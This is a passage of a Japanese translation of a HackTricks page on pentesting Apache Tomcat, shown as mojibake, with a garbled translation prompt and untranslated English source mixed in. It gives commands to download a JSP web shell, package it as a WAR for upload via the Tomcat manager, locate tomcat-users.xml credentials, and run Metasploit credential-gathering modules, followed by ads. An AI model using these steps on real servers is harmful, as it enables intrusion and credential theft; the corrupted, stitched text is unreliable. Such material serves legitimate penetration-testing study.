ä»¥ä¸‹ã¯ã€ãƒãƒƒã‚­ãƒ³ã‚°æŠ€è¡“ã«é–¢ã™ã‚‹æœ¬ã‹ã‚‰ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã§ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«network-services-pentesting/pentesting-web/tomcat.mdã‹ã‚‰ã®ã‚‚ã®ã§ã™ã€‚é–¢é€£ã™ã‚‹è‹±æ–‡ã‚’æ—¥æœ¬èªã«ç¿»è¨³ã—ã€ç¿»è¨³ã‚’è¿”ã—ã€ãƒãƒ¼ã‚¯ãƒ€ã‚¦ãƒ³ã¨HTMLã®æ§‹æ–‡ã‚’ãã®ã¾ã¾ä¿æŒã—ã¦ãã ã•ã„ã€‚ã‚³ãƒ¼ãƒ‰ã€ãƒãƒƒã‚­ãƒ³ã‚°æŠ€è¡“ã®åå‰ã€ãƒãƒƒã‚­ãƒ³ã‚°ã®è¨€è‘‰ã€ã‚¯ãƒ©ã‚¦ãƒ‰/SaaSãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®åå‰ï¼ˆWorkspaceã€awsã€gcpãªã©ï¼‰ã€'leak'ã¨ã„ã†å˜èªã€pentestingã€ãŠã‚ˆã³ãƒãƒ¼ã‚¯ãƒ€ã‚¦ãƒ³ã‚¿ã‚°ãªã©ã¯ç¿»è¨³ã—ãªã„ã§ãã ã•ã„ã€‚ã¾ãŸã€ç¿»è¨³ã¨ãƒãƒ¼ã‚¯ãƒ€ã‚¦ãƒ³ã®æ§‹æ–‡ä»¥å¤–ã®è¿½åŠ ã®ã‚‚ã®ã¯è¿½åŠ ã—ãªã„ã§ãã ã•ã„ã€‚

```
You could also install this (allows upload, download and command execution): [http://vonloesch.de/filebrowser.html](http://vonloesch.de/filebrowser.html)

### Manual Method 2

Get a JSP web shell such as [this](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) and create a WAR file:
```

### æ‰‹å‹•æ–¹æ³•2

ä»¥ä¸‹ã®ã‚ˆã†ãªJSPã‚¦ã‚§ãƒ–ã‚·ã‚§ãƒ«ã‚’å…¥æ‰‹ã—ã€WARãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã—ã¾ã™ï¼š
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
# When this file is uploaded to the manager GUI, the /backup application will be added to the table.
# Go to: http://tomcat-site.local:8180/backup/cmd.jsp
```
## POST

Tomcatã®èªè¨¼æƒ…å ±ãƒ•ã‚¡ã‚¤ãƒ«ã®åå‰ã¯ _tomcat-users.xml_ ã§ã™ã€‚
```bash
find / -name tomcat-users.xml 2>/dev/null
```
ä»–ã®Tomcatã®è³‡æ ¼æƒ…å ±ã‚’åé›†ã™ã‚‹æ–¹æ³•:
```bash
msf> use post/multi/gather/tomcat_gather
msf> use post/windows/gather/enum_tomcat
```
## ä»–ã®Tomcatã‚¹ã‚­ãƒ£ãƒ³ãƒ„ãƒ¼ãƒ«

* [https://github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)

<details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

æœ€ã‚‚é‡è¦ãªè„†å¼±æ€§ã‚’è¦‹ã¤ã‘ã¦ã€ã‚ˆã‚Šé€Ÿãä¿®æ­£ã§ãã¾ã™ã€‚Intruderã¯æ”»æ’ƒå¯¾è±¡ã‚’è¿½è·¡ã—ã€ç©æ¥µçš„ãªè„…å¨ã‚¹ã‚­ãƒ£ãƒ³ã‚’å®Ÿè¡Œã—ã€APIã‹ã‚‰Webã‚¢ãƒ—ãƒªã¾ã§ã€ã‚¯ãƒ©ã‚¦ãƒ‰ã‚·ã‚¹ãƒ†ãƒ å…¨ä½“ã§å•é¡Œã‚’è¦‹ã¤ã‘ã¾ã™ã€‚[**ç„¡æ–™ã§ãŠè©¦ã—ãã ã•ã„**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ã€‚

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’å…¥æ‰‹**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€HackTricksã‚’**PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
